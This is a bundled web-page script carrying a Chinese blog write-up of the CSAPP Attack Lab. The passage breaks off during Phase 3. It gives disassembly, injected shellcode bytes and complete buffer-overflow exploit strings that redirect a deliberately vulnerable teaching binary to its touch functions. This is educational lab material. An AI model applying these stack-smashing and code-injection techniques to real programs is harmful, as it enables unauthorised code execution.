"use strict";(self.webpackChunkcs_notes=self.webpackChunkcs_notes||[]).push([[3299],{3905:(e,t,n)=>{n.d(t,{Zo:()=>k,kt:()=>c});var a=n(67294);function l(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function p(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){l(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,a,l=function(e,t){if(null==e)return{};var n,a,l={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(l[n]=e[n]);return l}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(l[n]=e[n])}return l}var o=a.createContext({}),d=function(e){var t=a.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):p(p({},t),e)),n},k=function(e){var t=d(e.components);return a.createElement(o.Provider,{value:t},e.children)},s="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,l=e.mdxType,i=e.originalType,o=e.parentName,k=r(e,["components","mdxType","originalType","parentName"]),s=d(n),u=l,c=s["".concat(o,".").concat(u)]||s[u]||m[u]||i;return n?a.createElement(c,p(p({ref:t},k),{},{components:n})):a.createElement(c,p({ref:t},k))}));function c(e,t){var n=arguments,l=t&&t.mdxType;if("string"==typeof e||l){var i=n.length,p=new Array(i);p[0]=u;var r={};for(var o in t)hasOwnProperty.call(t,o)&&(r[o]=t[o]);r.originalType=e,r[s]="string"==typeof e?e:l,p[1]=r;for(var d=2;d<i;d++)p[d]=n[d];return a.createElement.apply(null,p)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},41974:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>p,default:()=>m,frontMatter:()=>i,metadata:()=>r,toc:()=>d});var a=n(87462),l=(n(67294),n(3905));const i={},p="Lab3-Attack Lab \u6df1\u5165\u89e3\u6790",r={unversionedId:"system/CSAPP/Lab03-Attack_Lab",id:"system/CSAPP/Lab03-Attack_Lab",title:"Lab3-Attack Lab \u6df1\u5165\u89e3\u6790",description:"\u7eb8\u4e0a\u5f97\u6765\u7ec8\u89c9\u6d45\uff0c\u7edd\u77e5\u6b64\u4e8b\u8981\u8eac\u884c",source:"@site/docs/system/CSAPP/Lab03-Attack_Lab.md",sourceDirName:"system/CSAPP",slug:"/system/CSAPP/Lab03-Attack_Lab",permalink:"/system/CSAPP/Lab03-Attack_Lab",draft:!1,editUrl:"https://github.com/kcxain/kcxain.github.io/tree/master/docs/system/CSAPP/Lab03-Attack_Lab.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab2-Bomb Lab \u6df1\u5165\u89e3\u6790",permalink:"/system/CSAPP/Lab02-Bomb_Lab"},next:{title:"Lab4-Architecture Lab \u6df1\u5165\u89e3\u6790",permalink:"/system/CSAPP/Lab04-Architecture_Lab"}},o={},d=[{value:"\u5b9e\u9a8c\u6982\u89c8",id:"\u5b9e\u9a8c\u6982\u89c8",level:2},{value:"Part 1: Code Injection Attacks",id:"part-1-code-injection-attacks",level:2},{value:"Phase 1",id:"phase-1",level:2},{value:"\u5206\u6790",id:"\u5206\u6790",level:3},{value:"\u53cd\u6c47\u7f16<code>test</code>",id:"\u53cd\u6c47\u7f16test",level:3},{value:"\u53cd\u6c47\u7f16<code>getbuf</code>",id:"\u53cd\u6c47\u7f16getbuf",level:3},{value:"Solution",id:"solution",level:3},{value:"Phase 2",id:"phase-2",level:2},{value:"\u5206\u6790",id:"\u5206\u6790-1",level:3},{value:"\u6ce8\u5165\u4ee3\u7801",id:"\u6ce8\u5165\u4ee3\u7801",level:3},{value:"\u6808\u5e27\u8bb2\u89e3",id:"\u6808\u5e27\u8bb2\u89e3",level:3},{value:"Solution",id:"solution-1",level:3},{value:"Phase 3",id:"phase-3",level:2},{value:"\u5206\u6790",id:"\u5206\u6790-2",level:3},{value:"\u6ce8\u5165\u4ee3\u7801",id:"\u6ce8\u5165\u4ee3\u7801-1",level:3},{value:"\u6808\u5e27\u8bb2\u89e3",id:"\u6808\u5e27\u8bb2\u89e3-1",level:3},{value:"Solution",id:"solution-2",level:3},{value:"Part 2: Return-Oriented Programming",id:"part-2-return-oriented-programming",level:2},{value:"Phase 4",id:"phase-4",level:2},{value:"\u5206\u6790",id:"\u5206\u6790-3",level:3},{value:"\u6808\u5e27\u8bb2\u89e3",id:"\u6808\u5e27\u8bb2\u89e3-2",level:3},{value:"Solution",id:"solution-3",level:3},{value:"Phase 5",id:"phase-5",level:2},{value:"\u5206\u6790",id:"\u5206\u6790-4",level:3},{value:"\u6808\u5e27\u8bb2\u89e3",id:"\u6808\u5e27\u8bb2\u89e3-3",level:3},{value:"Solution",id:"solution-4",level:3},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:2}],k={toc:d},s="wrapper";function m(e){let{components:t,...i}=e;return(0,l.kt)(s,(0,a.Z)({},k,i,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h1",{id:"lab3-attack-lab-\u6df1\u5165\u89e3\u6790"},"Lab3-Attack Lab \u6df1\u5165\u89e3\u6790"),(0,l.kt)("blockquote",null,(0,l.kt)("p",{parentName:"blockquote"},"\u7eb8\u4e0a\u5f97\u6765\u7ec8\u89c9\u6d45\uff0c\u7edd\u77e5\u6b64\u4e8b\u8981\u8eac\u884c")),(0,l.kt)("h2",{id:"\u5b9e\u9a8c\u6982\u89c8"},"\u5b9e\u9a8c\u6982\u89c8"),(0,l.kt)("p",null,"Attack\uff01\u6210\u4e3a\u4e00\u540d\u9ed1\u5ba2\u4e0d\u6b63\u662f\u6211\u5c0f\u65f6\u5019\u7684\u68a6\u60f3\u5417\uff1f\u8fd9\u4e2a\u5b9e\u9a8c\u4e00\u5b9a\u4f1a\u5f88\u6709\u8da3\u3002"),(0,l.kt)("p",null,"CMU \u5bf9\u672c\u5b9e\u9a8c\u7684\u5b98\u65b9\u8bf4\u660e\u6587\u6863\uff1a",(0,l.kt)("a",{parentName:"p",href:"http://csapp.cs.cmu.edu/3e/attacklab.pdf%EF%BC%8C%E6%8C%89%E7%85%A7"},"http://csapp.cs.cmu.edu/3e/attacklab.pdf\uff0c\u6309\u7167")," CMU \u7684\u6587\u6863\u4e00\u6b65\u6b65\u5f80\u4e0b\u8d70\u5c31\u53ef\u4ee5\u4e86\u3002"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(42291).Z,width:"1240",height:"519"})),(0,l.kt)("h2",{id:"part-1-code-injection-attacks"},"Part 1: Code Injection Attacks"),(0,l.kt)("p",null,"\u5728\u7b2c\u4e00\u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u8981\u653b\u51fb\u7684\u662f",(0,l.kt)("inlineCode",{parentName:"p"},"ctarget"),"\u3002\u5229\u7528",(0,l.kt)("strong",{parentName:"p"},"\u7f13\u51b2\u533a\u6ea2\u51fa"),"\uff0c\u5c31\u662f\u7a0b\u5e8f\u7684\u6808\u4e2d\u5206\u914d\u67d0\u4e2a\u5b57\u7b26\u6570\u7ec4\u6765\u4fdd\u5b58\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u800c\u6211\u4eec\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u53ef\u4ee5\u5305\u542b\u4e00\u4e9b\u53ef\u6267\u884c\u4ee3\u7801\u7684\u5b57\u8282\u7f16\u7801\u6216\u8005\u4e00\u4e2a\u6307\u5411\u653b\u51fb\u4ee3\u7801\u7684\u6307\u9488\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002\u90a3\u4e48\u5c31\u80fd\u76f4\u63a5\u5b9e\u73b0\u76f4\u63a5\u653b\u51fb\u6216\u8005\u5728\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u6307\u4ee4\u540e\u8df3\u8f6c\u5230\u653b\u51fb\u4ee3\u7801\u3002"),(0,l.kt)("h2",{id:"phase-1"},"Phase 1"),(0,l.kt)("h3",{id:"\u5206\u6790"},"\u5206\u6790"),(0,l.kt)("p",null,"\u9996\u5148\u7ed9\u4e86",(0,l.kt)("inlineCode",{parentName:"p"},"test"),"\u51fd\u6570\u7684C\u8bed\u8a00\u4ee3\u7801\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},'void test()\n{\n    int val;\n    val = getbuf();\n    printf("No exploit. Getbuf returned 0x%x\\n", val);\n}\n')),(0,l.kt)("p",null,"\u8fd9\u4e2a\u51fd\u6570\u8c03\u7528\u4e86",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u51fd\u6570\uff0c\u9898\u76ee\u8981\u6c42\u6211\u4eec\u901a\u8fc7\u4ee3\u7801\u6ce8\u5165\u7684\u65b9\u5f0f\u4f7f",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u6267\u884c\u7ed3\u675f\u540e\u4e0d\u8fd4\u56de\u5230",(0,l.kt)("inlineCode",{parentName:"p"},"test"),"\u51fd\u6570\u4e2d\uff0c\u800c\u662f\u8fd4\u56de\u5230",(0,l.kt)("inlineCode",{parentName:"p"},"touch1"),"\u51fd\u6570\u3002"),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"touch1"),"\u7684C\u8bed\u8a00\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},'void touch1()\n{\n    vlevel = 1; /* Part of validation protocol */\n    printf("Touch1!: You called touch1()\\n");\n    validate(1);\n    exit(0);\n}\n')),(0,l.kt)("h3",{id:"\u53cd\u6c47\u7f16test"},"\u53cd\u6c47\u7f16",(0,l.kt)("inlineCode",{parentName:"h3"},"test")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"Dump of assembler code for function test:\n   0x0000000000401968 <+0>:     sub    $0x8,%rsp\n   0x000000000040196c <+4>:     mov    $0x0,%eax\n   0x0000000000401971 <+9>:     callq  0x4017a8 <getbuf>\n   0x0000000000401976 <+14>:    mov    %eax,%edx\n   0x0000000000401978 <+16>:    mov    $0x403188,%esi\n   0x000000000040197d <+21>:    mov    $0x1,%edi\n   0x0000000000401982 <+26>:    mov    $0x0,%eax\n   0x0000000000401987 <+31>:    callq  0x400df0 <__printf_chk@plt>\n   0x000000000040198c <+36>:    add    $0x8,%rsp\n   0x0000000000401990 <+40>:    retq\nEnd of assembler dump.\n")),(0,l.kt)("p",null,"\u7b2c2\u884c\u5206\u914d\u6808\u5e27\uff0c\u7b2c4\u884c\u8c03\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u51fd\u6570"),(0,l.kt)("h3",{id:"\u53cd\u6c47\u7f16getbuf"},"\u53cd\u6c47\u7f16",(0,l.kt)("inlineCode",{parentName:"h3"},"getbuf")),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"Dump of assembler code for function getbuf:\n   0x00000000004017a8 <+0>:     sub    $0x28,%rsp\n   0x00000000004017ac <+4>:     mov    %rsp,%rdi\n   0x00000000004017af <+7>:     callq  0x401a40 <Gets>\n   0x00000000004017b4 <+12>:    mov    $0x1,%eax\n   0x00000000004017b9 <+17>:    add    $0x28,%rsp\n   0x00000000004017bd <+21>:    retq\nEnd of assembler dump.\n")),(0,l.kt)("p",null,"\u5206\u914d\u4e8640\u4e2a\u5b57\u8282\u7684\u6808\u5e27\uff0c\u968f\u540e\u5c06\u6808\u9876\u4f4d\u7f6e\u4f5c\u4e3a\u53c2\u6570\u8c03\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"Gets"),"\u51fd\u6570\uff0c\u8bfb\u5165\u5b57\u7b26\u4e32\u3002"),(0,l.kt)("p",null,"\u6b64\u65f6\uff0c\u6808\u5e27\u60c5\u51b5\u662f\u8fd9\u6837\u7684\uff1a\uff08\u4ee58\u4e2a\u5b57\u8282\u4e3a\u5355\u4f4d\uff09"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(89253).Z,width:"1390",height:"661"})),(0,l.kt)("p",null,"\u67e5\u5230",(0,l.kt)("inlineCode",{parentName:"p"},"touch1"),"\u4ee3\u7801\u5730\u5740\u4e3a\uff1a",(0,l.kt)("inlineCode",{parentName:"p"},"0x4017c0")),(0,l.kt)("p",null,"\u7531\u6b64\u5c31\u6709\u4e86\u601d\u8def\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8f93\u516541\u4e2a\u5b57\u7b26\uff0c\u524d40\u4e2a\u5b57\u8282\u5c06",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u7684\u6808\u7a7a\u95f4\u586b\u6ee1\uff0c\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5c06\u8fd4\u56de\u503c\u8986\u76d6\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"0x4017c0"),"\u5373",(0,l.kt)("inlineCode",{parentName:"p"},"touch1"),"\u7684\u5730\u5740\uff0c\u8fd9\u6837\uff0c\u5728",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"p"},"retq"),"\u6307\u4ee4\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8df3\u8f6c\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"p"},"touch1"),"\u51fd\u6570\u3002"),(0,l.kt)("h3",{id:"solution"},"Solution"),(0,l.kt)("p",null,"\u91c7\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"Write up"),"\u63a8\u8350\u65b9\u6cd5\uff0c\u521b\u5efa\u4e00\u4e2a",(0,l.kt)("inlineCode",{parentName:"p"},"txt"),"\u6587\u6863\u5b58\u50a8\u8f93\u5165\u3002\u5e76\u6309\u7167",(0,l.kt)("inlineCode",{parentName:"p"},"HEX2RAW"),"\u5de5\u5177\u7684\u8bf4\u660e\uff0c\u5728\u6bcf\u4e2a\u5b57\u8282\u95f4\u7528\u7a7a\u683c\u6216\u56de\u8f66\u9694\u5f00\u3002"),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},(0,l.kt)("inlineCode",{parentName:"strong"},"x86"),"\u91c7\u7528\u5c0f\u7aef\u5b58\u50a8\uff0c\u8981\u6ce8\u610f\u8f93\u5165\u5b57\u8282\u7684\u987a\u5e8f")),(0,l.kt)("p",null,"\u6211\u4eec\u7684\u8f93\u5165\u4e3a\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\nc0 17 40 00 00 00 00 00\n")),(0,l.kt)("p",null,"\u6267\u884c\u547d\u4ee4\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"./hex2raw < ctarget01.txt | ./ctarget -q\n")),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"./hex2raw < ctarget01.txt"),"\u662f\u5229\u7528",(0,l.kt)("inlineCode",{parentName:"li"},"hex2raw"),"\u5de5\u5177\u5c06\u6211\u4eec\u7684\u8f93\u5165\u770b\u4f5c\u5b57\u8282\u7ea7\u7684\u5341\u516d\u8fdb\u5236\u8868\u793a\u8fdb\u884c\u8f6c\u5316\uff0c\u7528\u6765\u751f\u6210\u653b\u51fb\u5b57\u7b26\u4e32"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"|"),"\u8868\u793a\u7ba1\u9053\uff0c\u5c06\u8f6c\u5316\u540e\u7684\u8f93\u5165\u6587\u4ef6\u4f5c\u4e3a",(0,l.kt)("inlineCode",{parentName:"li"},"ctarget"),"\u7684\u8f93\u5165\u53c2\u6570"),(0,l.kt)("li",{parentName:"ul"},"\u7531\u4e8e\u6267\u884c\u7a0b\u5e8f\u4f1a\u9ed8\u8ba4\u8fde\u63a5 CMU \u7684\u670d\u52a1\u5668\uff0c",(0,l.kt)("inlineCode",{parentName:"li"},"-q"),"\u8868\u793a\u53d6\u6d88\u8fd9\u4e00\u8fde\u63a5")),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(55892).Z,width:"985",height:"547"})),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u653b\u51fb\u6210\u529f\uff01")),(0,l.kt)("h2",{id:"phase-2"},"Phase 2"),(0,l.kt)("h3",{id:"\u5206\u6790-1"},"\u5206\u6790"),(0,l.kt)("p",null,"\u672c\u9898\u7ed3\u6784\u4e0e\u4e0a\u9898\u76f8\u540c\uff0c\u4e0d\u540c\u7684\u662f\u8c03\u7528\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"touch2"),"\u51fd\u6570\u7684\u5185\u5bb9\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},'void touch2(unsigned val)\n{\n    vlevel = 2; /* Part of validation protocol */\n    if (val == cookie) {\n        printf("Touch2!: You called touch2(0x%.8x)\\n", val);\n        validate(2);\n    } else {\n        printf("Misfire: You called touch2(0x%.8x)\\n", val);\n        fail(2);\n        }\n    exit(0);\n}\n')),(0,l.kt)("p",null,"\u4e0d\u4ec5\u9700\u8981\u4fee\u6539\u8fd4\u56de\u5730\u5740\u8c03\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"touch2"),"\u51fd\u6570\uff0c\u8fd8\u9700\u8981\u628a",(0,l.kt)("inlineCode",{parentName:"p"},"cookie"),"\u4f5c\u4e3a\u53c2\u6570\u4f20\u8fdb\u53bb\u3002\u9898\u76ee\u5efa\u8bae\u6211\u4eec\u4e0d\u4f7f\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"jmp"),"\u548c",(0,l.kt)("inlineCode",{parentName:"p"},"call"),"\u6307\u4ee4\u8fdb\u884c\u4ee3\u7801\u8df3\u8f6c\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u80fd\u901a\u8fc7\u5728\u6808\u4e2d\u4fdd\u5b58\u76ee\u6807\u4ee3\u7801\u7684\u5730\u5740\uff0c\u7136\u540e\u4ee5",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u7684\u5f62\u5f0f\u8fdb\u884c\u8df3\u8f6c\u3002"),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u6211\u4eec\u5148\u6df1\u5165\u7406\u89e3",(0,l.kt)("inlineCode",{parentName:"strong"},"ret"),"\u6307\u4ee4\uff1a")),(0,l.kt)("p",null,"\u5728CPU\u4e2d\u6709\u4e00\u4e2a\u201cPC\u201d\u5373\u7a0b\u5e8f\u5bc4\u5b58\u5668\uff0c\u5728 x86-64 \u4e2d\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"%rip"),"\u8868\u793a\uff0c\u5b83\u65f6\u523b\u6307\u5411\u5c06\u8981\u6267\u884c\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002\u800c\u6211\u4eec\u7684",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u6307\u4ee4\u5c31\u76f8\u5f53\u4e8e\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"pop %rip\n")),(0,l.kt)("p",null,"\u5373\u628a\u6808\u4e2d\u5b58\u653e\u7684\u5730\u5740\u5f39\u51fa\u4f5c\u4e3a\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u3002"),(0,l.kt)("p",null,"\u4e8e\u662f\uff0c\u5229\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"push"),"\u548c",(0,l.kt)("inlineCode",{parentName:"p"},"ret"),"\u5c31\u80fd\u5b9e\u73b0\u6211\u4eec\u7684\u6307\u4ee4\u8f6c\u79fb\u5566\uff01"),(0,l.kt)("p",null,"\u601d\u8def\u5982\u4e0b\uff1a"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("p",{parentName:"li"},"\u9996\u5148\uff0c\u901a\u8fc7\u5b57\u7b26\u4e32\u8f93\u5165\u628a",(0,l.kt)("inlineCode",{parentName:"p"},"caller"),"\u7684\u6808\u4e2d\u50a8\u5b58\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u6ce8\u5165\u4ee3\u7801\u7684\u5b58\u653e\u5730\u5740")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("p",{parentName:"li"},"\u7136\u540e\uff0c\u7f16\u5199\u4ee3\u7801\u3002\u6211\u4eec\u7684\u4ee3\u7801\u5e94\u8be5\u5b8c\u6210\u54ea\u4e9b\u5de5\u4f5c\u5462\uff1f"),(0,l.kt)("ul",{parentName:"li"},(0,l.kt)("li",{parentName:"ul"},"\u67e5\u770b",(0,l.kt)("inlineCode",{parentName:"li"},"cookie"),"\u503c\u4e3a",(0,l.kt)("inlineCode",{parentName:"li"},"0x59b997fa"),"\uff0c\u5148\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u5bc4\u5b58\u5668\u4fee\u6539\u4e3a\u8be5\u503c"),(0,l.kt)("li",{parentName:"ul"},"\u5728\u6808\u4e2d\u538b\u5165",(0,l.kt)("inlineCode",{parentName:"li"},"touch2"),"\u4ee3\u7801\u5730\u5740"),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\u6307\u4ee4\u8c03\u7528\u8fd4\u56de\u5730\u5740\u4e5f\u5c31\u662f",(0,l.kt)("inlineCode",{parentName:"li"},"touch2")))),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("p",{parentName:"li"},"\u786e\u5b9a\u6ce8\u5165\u4ee3\u7801\u7684\u5730\u5740\u3002\u4ee3\u7801\u5e94\u8be5\u5b58\u5728",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u5206\u914d\u7684\u6808\u4e2d\uff0c\u5730\u5740\u4e3a",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u51fd\u6570\u4e2d\u7684\u6808\u9876"))),(0,l.kt)("h3",{id:"\u6ce8\u5165\u4ee3\u7801"},"\u6ce8\u5165\u4ee3\u7801"),(0,l.kt)("p",null,"\u67e5\u5230",(0,l.kt)("inlineCode",{parentName:"p"},"touch2"),"\u4ee3\u7801\u5730\u5740\u4e3a\uff1a",(0,l.kt)("inlineCode",{parentName:"p"},"0x4017c0"),"\uff0c\u7531\u4e0a\u8ff0\u601d\u8def\uff0c\u5f97\u4ee3\u7801\u5982\u4e0b\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"movq    $0x59b997fa, %rdi\npushq   $0x4017ec\nret\n")),(0,l.kt)("p",null,"\u5229\u7528",(0,l.kt)("inlineCode",{parentName:"p"},"gdb"),"\u5728",(0,l.kt)("inlineCode",{parentName:"p"},"getbuf"),"\u5206\u914d\u6808\u5e27\u540e\u6253\u65ad\u70b9\uff0c\u67e5\u770b\u6808\u9876\u6307\u9488\u7684\u4f4d\u7f6e"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(85106).Z,width:"985",height:"547"})),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"0x5561dc78"),"\u8fd9\u5c31\u662f\u6211\u4eec\u5e94\u8be5\u4fee\u6539\u7684\u8fd4\u56de\u5730\u5740"),(0,l.kt)("h3",{id:"\u6808\u5e27\u8bb2\u89e3"},"\u6808\u5e27\u8bb2\u89e3"),(0,l.kt)("p",null,"\u6309\u7167\u6211\u4eec\u7684\u601d\u8def\uff0c\u8f93\u5165\u5b57\u7b26\u4e32\u540e\u7684\u6808\u5e27\u5e94\u8be5\u662f\u8fd9\u6837\u7684"),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(77532).Z,width:"1407",height:"678"})),(0,l.kt)("p",null,"\u903b\u8f91\u5982\u4e0b\uff1a"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("inlineCode",{parentName:"li"},"getbuf"),"\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\u6307\u4ee4\u540e\uff0c\u6ce8\u5165\u4ee3\u7801\u7684\u5730\u5740\u4ece\u6808\u4e2d\u5f39\u51fa"),(0,l.kt)("li",{parentName:"ul"},"\u7a0b\u5e8f\u6267\u884c\u6211\u4eec\u7f16\u5199\u7684\u4ee3\u7801\uff0c\u5f53\u518d\u6b21\u6267\u884c",(0,l.kt)("inlineCode",{parentName:"li"},"ret"),"\u540e\uff0c\u4ece\u6808\u4e2d\u5f39\u51fa\u7684\u5c31\u662f\u6211\u4eec\u538b\u5165\u7684",(0,l.kt)("inlineCode",{parentName:"li"},"touch2"),"\u51fd\u6570\u7684\u5730\u5740\uff0c\u6210\u529f\u8df3\u8f6c")),(0,l.kt)("h3",{id:"solution-1"},"Solution"),(0,l.kt)("p",null,"\u5148\u5c06\u6211\u4eec\u7684\u6c47\u7f16\u4ee3\u7801\u4fdd\u5b58\u5230\u4e00\u4e2a",(0,l.kt)("inlineCode",{parentName:"p"},".s"),"\u6587\u4ef6\u4e2d\uff0c\u63a5\u4e0b\u6765\u5229\u7528\u5982\u4e0b\u6307\u4ee4"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"gcc -c injectcode.s\nobjdump -d injectcode.o > injectcode.d\n")),(0,l.kt)("p",null,"\u5f97\u5230\u5b57\u8282\u7ea7\u8868\u793a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-assembly"},"Disassembly of section .text:\n\n0000000000000000 <.text>:\n   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi\n   7:   68 ec 17 40 00          pushq  $0x4017ec\n   c:   c3                      retq\n")),(0,l.kt)("p",null,"\u5c06\u8fd9\u6bb5\u4ee3\u7801\u653e\u523040\u4e2a\u5b57\u8282\u4e2d\u7684\u5f00\u5934\uff0c\u4ee3\u7801\u5730\u5740\u653e\u5230\u672b\u5c3e\u3002\u4e8e\u662f\u5c31\u5f97\u5230\u6211\u4eec\u7684\u8f93\u5165\u4e3a\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-bash"},"48 c7 c7 fa 97 b9 59 68 \nec 17 40 00 c3 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n78 dc 61 55 00 00 00 00\n")),(0,l.kt)("p",null,(0,l.kt)("img",{src:n(7123).Z,width:"962",height:"300"})),(0,l.kt)("p",null,(0,l.kt)("strong",{parentName:"p"},"\u653b\u51fb\u6210\u529f\uff01")),(0,l.kt)("h2",{id:"phase-3"},"Phase 3"),(0,l.kt)("h3",{id:"\u5206\u6790-2"},"\u5206\u6790"),(0,l.kt)("p",null,"\u672c\u9898\u4e0e\u4e0a\u9898\u7c7b\u4f3c\uff0c\u4e0d\u540c\u70b9\u5728\u4e8e\u4f20\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5148\u7ed9\u51fa",(0,l.kt)("inlineCode",{parentName:"p"},"touch3"),"\u7684C\u8bed\u8a00\u4ee3\u7801"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},'void touch3(char *sval)\n{\n    vlevel = 3; /* Part of validation protocol */\n    if (hexmatch(cookie, sval)) {\n        printf("Touch3!: You called touch3(\\"%s\\")\\n", sval);\n        validate(3);\n    } else {\n        printf("Misfire: You called touch3(\\"%s\\")\\n", sval);\n        fail(3);\n    }\n    exit(0);\n}\n')),(0,l.kt)("p",null,(0,l.kt)("inlineCode",{parentName:"p"},"touch3"),"\u4e2d\u8c03\u7528\u4e86",(0,l.kt)("inlineCode",{parentName:"p"},"hexmatch"),"\uff0c\u5b83\u7684C\u8bed\u8a00\u4ee3\u7801\u4e3a\uff1a"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-c"},'/* Compare string to hex represention of unsigned value */\nint hexmatch(unsigned val, char *sval)\n{\n    char cbuf[110];\n    /* Make position of check string unpredictable */\n    char *s = cbuf + random() % 100;\n    sprintf(s, "%.8x", val);\n    return strncmp(sval, s, 9) == 